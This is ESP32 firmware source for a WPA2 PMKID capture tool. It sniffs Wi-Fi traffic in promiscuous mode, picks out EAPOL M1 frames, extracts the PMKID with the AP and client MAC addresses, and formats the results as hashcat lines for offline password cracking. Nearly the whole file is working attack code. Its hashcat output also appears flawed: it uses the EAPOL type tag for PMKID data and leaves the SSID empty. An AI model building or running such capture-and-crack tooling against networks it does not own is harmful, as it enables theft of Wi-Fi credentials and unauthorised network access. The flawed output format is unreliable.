/**
 * pmkid_capture.cpp — WPA2 PMKID Capture
 *
 * Bug fixes vs previous:
 *   - Key Data Length was at k[95..96], correct offset is k[93..94]
 *   - Added Key Type check (bit 3) to M1 detection
 *   - Full serial debug so we can see exactly what each frame contains
 *   - No channel hopping — stay on softAP channel (ch1 = same as Sky)
 */
#include "pmkid_capture.h"
#include "cyber_storage.h"

PMKIDCapture_t* PMKIDCapture_t::_instance = nullptr;

static String _ms(const uint8_t* m) {
  char b[18];
  snprintf(b,18,"%02x:%02x:%02x:%02x:%02x:%02x",
    m[0],m[1],m[2],m[3],m[4],m[5]);
  return String(b);
}

void PMKIDCapture_t::begin() { _running=false; _count=0; _instance=this; }

void PMKIDCapture_t::start() {
  _running=true; _count=0;
  wifi_promiscuous_filter_t f = {.filter_mask=WIFI_PROMIS_FILTER_MASK_ALL};
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(_cb);
  Serial.println("PMKID: started — no channel hop, staying on ch1");
  Serial.println("PMKID: reconnect a device to your Sky router now");
}

void PMKIDCapture_t::stop() {
  _running=false;
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  delay(30);
  esp_wifi_set_promiscuous(false);
  Serial.printf("PMKID: stopped. Captures=%d\n",_count);
}

void PMKIDCapture_t::tick() { /* no channel hopping */ }

void IRAM_ATTR PMKIDCapture_t::_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if(!_instance||!_instance->_running) return;
  wifi_promiscuous_pkt_t* p=(wifi_promiscuous_pkt_t*)buf;
  _instance->_process(p->payload, p->rx_ctrl.sig_len, p->rx_ctrl.channel);
}

bool PMKIDCapture_t::_seen(const String& p) {
  for(int i=0;i<_count;i++) if(_caps[i].pmkid==p) return true;
  return false;
}

void PMKIDCapture_t::_process(const uint8_t* d, int len, uint8_t ch) {
  if(len<36) return;

  // Marauder fixed-offset EAPOL detection
  // Non-QoS: 24B 802.11 hdr + 6B LLC = EtherType at byte 30
  // QoS:     26B 802.11 hdr + 6B LLC = EtherType at byte 32
  int eapolStart = 0;
  if(len>33 && d[30]==0x88 && d[31]==0x8E)      eapolStart=32;
  else if(len>35 && d[32]==0x88 && d[33]==0x8E) eapolStart=34;
  else return;

  if(len < eapolStart+4) return;
  if(d[eapolStart+1] != 0x03) return; // must be EAPOL-Key

  // EAPOL-Key body: starts at eapolStart+4
  const uint8_t* k = d + eapolStart + 4;
  int klen = len - eapolStart - 4;
  if(klen < 95) return; // need at least fixed fields + 2B length field

  // Key Info at k[1..2]
  uint16_t info = ((uint16_t)k[1]<<8)|k[2];

  // Print every EAPOL frame with full details for debugging
  Serial.printf("PMKID: EAPOL ch%d len=%d KeyInfo=0x%04X ", ch, len, info);

  // Decode which message this is
  bool ack     = (info & 0x0080) != 0;
  bool mic     = (info & 0x0100) != 0;
  bool install = (info & 0x0040) != 0;
  bool secure  = (info & 0x0200) != 0;
  bool keyType = (info & 0x0008) != 0; // 1=pairwise, 0=group

  if     (ack && !mic && keyType)             Serial.println("-> M1");
  else if(!ack && mic && !install && !secure) Serial.println("-> M2");
  else if(ack && mic && install)              Serial.println("-> M3");
  else if(!ack && mic && secure)              Serial.println("-> M4");
  else                                         Serial.println("-> OTHER");

  // Only process M1: ACK=1, MIC=0, Install=0, KeyType=1(pairwise)
  if(!ack || mic || install || !keyType) return;

  Serial.println("PMKID: M1 confirmed, reading Key Data...");

  // Key Data Layout from IEEE 802.11i spec (offsets from k[0]):
  // k[0]    = Descriptor Type (1)
  // k[1-2]  = Key Info (2)
  // k[3-4]  = Key Length (2)
  // k[5-12] = Replay Counter (8)
  // k[13-44]= ANonce (32)
  // k[45-60]= Key IV (16)
  // k[61-68]= Key RSC (8)
  // k[69-76]= Key ID (8)
  // k[77-92]= Key MIC (16)
  // k[93-94]= Key Data Length (2)   <-- CORRECT OFFSET
  // k[95+]  = Key Data

  uint16_t kdLen = ((uint16_t)k[93]<<8)|k[94]; // FIXED: was k[95..96]
  Serial.printf("PMKID: Key Data Length = %d bytes\n", kdLen);

  if(kdLen == 0) {
    Serial.println("PMKID: Key Data is empty — Sky router may not include PMKID");
    Serial.println("PMKID: Use EAPOL Handshake Sniffer instead (captures M1+M2)");
    return;
  }

  if(klen < 95+(int)kdLen) {
    Serial.printf("PMKID: frame too short for Key Data (need %d have %d)\n",
                  95+kdLen, klen);
    return;
  }

  const uint8_t* kd = k+95;

  // Dump first 32 bytes of Key Data for debugging
  Serial.print("PMKID: Key Data hex: ");
  for(int i=0;i<min((int)kdLen,32);i++) Serial.printf("%02x ",kd[i]);
  Serial.println();

  // KDE scan: tag=0xDD | len | OUI=00:0F:AC | type=0x04 | 16B PMKID
  bool foundKde=false;
  for(int i=0; i+22<=(int)kdLen; i++) {
    if(kd[i]!=0xDD) continue;
    uint8_t kl=kd[i+1];
    if(kl<20) continue;
    if(i+2+kl>(int)kdLen) continue;
    Serial.printf("PMKID: KDE at [%d]: OUI=%02x:%02x:%02x type=%02x\n",
                  i,kd[i+2],kd[i+3],kd[i+4],kd[i+5]);
    if(kd[i+2]!=0x00||kd[i+3]!=0x0F||kd[i+4]!=0xAC) continue;
    if(kd[i+5]!=0x04) continue;
    foundKde=true;

    char hex[33];
    for(int j=0;j<16;j++) snprintf(hex+j*2,3,"%02x",kd[i+6+j]);
    hex[32]='\0';
    String pmkid(hex);

    if(_seen(pmkid)||_count>=MAX_PMKID_CAPS) break;

    bool fromDS=(d[1]&0x02)!=0;
    const uint8_t* apMac  = fromDS?(d+10):(d+16);
    const uint8_t* staMac = fromDS?(d+4) :(d+10);

    _caps[_count].pmkid    =pmkid;
    _caps[_count].bssid    =_ms(apMac);
    _caps[_count].clientMac=_ms(staMac);
    _caps[_count].channel  =ch;
    _caps[_count].timestamp=millis();
    _caps[_count].ssid     ="";
    _count++;

    Serial.println("╔══════════════════════════════╗");
    Serial.println("║   *** PMKID CAPTURED ***     ║");
    Serial.println("╠══════════════════════════════╣");
    Serial.printf( "║ AP    : %s\n",_ms(apMac).c_str());
    Serial.printf( "║ Client: %s\n",_ms(staMac).c_str());
    Serial.printf( "║ PMKID : %s\n",pmkid.c_str());
    Serial.println("╚══════════════════════════════╝");
    cyberStorage.addLog("capture","PMKID:"+_ms(apMac));
    break;
  }
  if(!foundKde && kdLen>0) {
    Serial.println("PMKID: No PMKID KDE found in Key Data");
    Serial.println("PMKID: Router does not send PMKID — use EAPOL sniffer");
  }
}

String PMKIDCapture_t::getHashcatLine(int i) {
  if(i<0||i>=_count) return "";
  PMKIDCapture& c=_caps[i];
  String ap=c.bssid; ap.replace(":","");
  String cl=c.clientMac; cl.replace(":","");
  String sh="";
  for(size_t j=0;j<c.ssid.length();j++){char h[3];snprintf(h,3,"%02x",(uint8_t)c.ssid[j]);sh+=h;}
  return "WPA*02*"+c.pmkid+"*"+ap+"*"+cl+"*"+sh+"***";
}

String PMKIDCapture_t::getHashcatFormat() {
  String o;
  for(int i=0;i<_count;i++) o+=getHashcatLine(i)+"\n";
  return o;
}
